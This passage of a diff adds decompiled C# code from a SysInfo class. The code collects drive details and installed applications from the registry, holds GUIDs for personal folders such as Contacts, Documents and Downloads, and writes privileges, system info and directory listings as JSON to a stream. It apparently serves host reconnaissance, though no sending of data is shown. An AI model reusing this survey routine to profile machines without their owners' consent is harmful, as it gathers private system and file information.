+  private static void WriteDriveInfo(JsonTextWriter jsonWriter)
+  {
+   jsonWriter.WritePropertyName("driveInfo");
+   jsonWriter.WriteStartArray();
+   try
+   {
+    foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
+    {
+     jsonWriter.WriteStartObject();
+     jsonWriter.WritePropertyName("Path");
+     jsonWriter.WriteValue(driveInfo.Name);
+     jsonWriter.WritePropertyName("type");
+     jsonWriter.WriteValue(driveInfo.DriveType.ToString());
+     jsonWriter.WritePropertyName("isReady");
+     jsonWriter.WriteValue(driveInfo.IsReady);
+     if (driveInfo.IsReady)
+     {
+      jsonWriter.WritePropertyName("TotalSize");
+      jsonWriter.WriteValue(driveInfo.TotalSize);
+      jsonWriter.WritePropertyName("FreeSpace");
+      jsonWriter.WriteValue(driveInfo.TotalFreeSpace);
+      jsonWriter.WritePropertyName("availableFreeSpace");
+      jsonWriter.WriteValue(driveInfo.AvailableFreeSpace);
+      jsonWriter.WritePropertyName("driveFormat");
+      jsonWriter.WriteValue(driveInfo.DriveFormat);
+      jsonWriter.WritePropertyName("volumeLabel");
+      jsonWriter.WriteValue(driveInfo.VolumeLabel);
+     }
+     jsonWriter.WriteEndObject();
+    }
+   }
+   catch (Exception ex)
+   {
+    jsonWriter.WriteStartObject();
+    jsonWriter.WritePropertyName("error");
+    jsonWriter.WriteValue(ex.ToString());
+    jsonWriter.WriteEndObject();
+   }
+   jsonWriter.WriteEndArray();
+  }
+  // Token: 0x06000031 RID: 49 RVA: 0x00004180 File Offset: 0x00002380
+  private static void WriteInstalledApps(JsonTextWriter jsonWriter)
+  {
+   jsonWriter.WritePropertyName("installedApps");
+   jsonWriter.WriteStartArray();
+   try
+   {
+    using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
+    {
+     foreach (string name in registryKey.GetSubKeyNames())
+     {
+      using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
+      {
+       if (registryKey2 != null)
+       {
+        string text = registryKey2.GetValue("DisplayName") as string;
+        if (text != null)
+        {
+         jsonWriter.WriteStartObject();
+         jsonWriter.WritePropertyName("Name");
+         jsonWriter.WriteValue(text);
+         jsonWriter.WritePropertyName("Version");
+         jsonWriter.WriteValue(registryKey2.GetValue("DisplayVersion"));
+         jsonWriter.WriteEndObject();
+        }
+       }
+      }
+     }
+    }
+   }
+   catch (Exception ex)
+   {
+    jsonWriter.WriteStartObject();
+    jsonWriter.WritePropertyName("error");
+    jsonWriter.WriteValue(ex.ToString());
+    jsonWriter.WriteEndObject();
+   }
+   jsonWriter.WriteEndArray();
+  }
+  // Token: 0x06000032 RID: 50 RVA: 0x0000429C File Offset: 0x0000249C
+  public static void WriteTo(Stream s)
+  {
+   JsonTextWriter jsonTextWriter = new JsonTextWriter(new StreamWriter(s, Encoding.UTF8));
+   jsonTextWriter.WriteStartObject();
+   SysInfo.WritePrivileges(jsonTextWriter);
+   SysInfo.WriteSysInfo(jsonTextWriter);
+   SysInfo.WriteDirectoryListing(jsonTextWriter);
+   SysInfo.WriteDriveInfo(jsonTextWriter);
+   SysInfo.WriteInstalledApps(jsonTextWriter);
+   jsonTextWriter.WriteEndObject();
+   jsonTextWriter.Flush();
+  }
+  // Token: 0x04000014 RID: 20
+  private static readonly Guid Contacts = new Guid("{56784854-C6CB-462B-8169-88E350ACB882}");
+  // Token: 0x04000015 RID: 21
+  private static readonly Guid Desktop = new Guid("{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}");
+  // Token: 0x04000016 RID: 22
+  private static readonly Guid Documents = new Guid("{FDD39AD0-238F-46AF-ADB4-6C85480369C7}");
+  // Token: 0x04000017 RID: 23
+  private static readonly Guid Downloads = new Guid("{374DE290-123F-4565-9164-39C4925E467B}");
+  // Token: 0x04000018 RID: 24
+  private static readonly Guid Favorites = new Guid("{1777F761-68AD-4D8A-87BD-30B759FA33DD}");
+  // Token: 0x04000019 RID: 25
+  private static readonly Guid Links = new Guid("{BFB9D5E0-C6A9-404C-B2B2-AE6DB6AF4968}");
+  // Token: 0x0400001A RID: 26
+  private static readonly Guid Music = new Guid("{4BD8D571-6D19-48D3-BE97-422220080E43}");
+  // Token: 0x0400001B RID: 27
+  private static readonly Guid Pictures = new Guid("{33E28130-4E1E-4676-835A-98395C3BC3BB}");
+  // Token: 0x0400001C RID: 28
+  private static readonly Guid SavedGames = new Guid("{4C5C32FF-BB9D-43B0-B5B4-2D72E54EAAA4}");
+  // Token: 0x0400001D RID: 29
+  private static readonly Guid SavedSearches = new Guid("{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}");
+  // Token: 0x0400001E RID: 30
+  private static readonly Guid Videos = new Guid("{18989B1D-99B5-455B-841C-AB7C74E4DDFC}");
+  // Token: 0x0200000C RID: 12
+  private enum TokenInformationClass
+  {
+   // Token: 0x0400002B RID: 43
+   TokenUser = 1,
+   // Token: 0x0400002C RID: 44
+   TokenGroups,
+   // Token: 0x0400002D RID: 45
+   TokenPrivileges,
+   // Token: 0x0400002E RID: 46
+   TokenOwner,
+   // Token: 0x0400002F RID: 47
+   TokenPrimaryGroup,
+   // Token: 0x04000030 RID: 48
+   TokenDefaultDacl,
+   // Token: 0x04000031 RID: 49
+   TokenSource,
+   // Token: 0x04000032 RID: 50
+   TokenType,
+   // Token: 0x04000033 RID: 51
+   TokenImpersonationLevel,
+   // Token: 0x04000034 RID: 52
+   TokenStatistics,
+   // Token: 0x04000035 RID: 53
+   TokenRestrictedSids,
+   // Token: 0x04000036 RID: 54
+   TokenSessionId,
+   // Token: 0x04000037 RID: 55
+   TokenGroupsAndPrivileges,
+   // Token: 0x04000038 RID: 56
+   TokenSessionReference,
+   // Token: 0x04000039 RID: 57
+   TokenSandBoxInert,
+   // Token: 0x0400003A RID: 58
+   TokenAuditPolicy,
+   // Token: 0x0400003B RID: 59
+   TokenOrigin,
+   // Token: 0x0400003C RID: 60
+   TokenElevationType,
+   // Token: 0x0400003D RID: 61
+   TokenLinkedToken,
+   // Token: 0x0400003E RID: 62
+   TokenElevation,
+   // Token: 0x0400003F RID: 63
+   TokenHasRestrictions,
+   // Token: 0x04000040 RID: 64
+   TokenAccessInformation,
+   // Token: 0x04000041 RID: 65
+   TokenVirtualizationAllowed,
+   // Token: 0x04000042 RID: 66
+   TokenVirtualizationEnabled,
+   // Token: 0x04000043 RID: 67
+   TokenIntegrityLevel,
+   // Token: 0x04000044 RID: 68
+   TokenUiAccess,
+   // Token: 0x04000045 RID: 69
+   TokenMandatoryPolicy,
+   // Token: 0x04000046 RID: 70
+   TokenLogonSid,
+   // Token: 0x04000047 RID: 71
+   MaxTokenInfoClass
+  }
+  // Token: 0x0200000D RID: 13
+  private enum TokenElevationType
+  {
+   // Token: 0x04000049 RID: 73
+   TokenElevationTypeDefault = 1,
+   // Token: 0x0400004A RID: 74
+   TokenElevationTypeFull,
+   // Token: 0x0400004B RID: 75
+   TokenElevationTypeLimited
+  }
+ }
 }
 ```
 
